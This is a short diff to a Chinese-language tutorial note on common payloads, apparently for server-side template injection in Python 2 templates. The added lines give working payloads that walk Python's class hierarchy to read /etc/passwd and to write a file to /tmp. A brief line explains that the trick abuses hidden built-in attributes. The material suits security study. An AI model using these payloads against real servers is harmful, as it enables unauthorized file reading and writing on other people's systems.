@@ -27,7 +27,11 @@ if __name__ == "__main__":
 # 常见payload解析
 ## 常见payload
 ```
-
+python2
+#读文件：
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+#写文件：
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1').write("") }}
 ```
 常见的payload的思路都常常是利用python内置的变量属性等出发·通过调用一些隐藏的属性（方法）从而实现代码输入
 
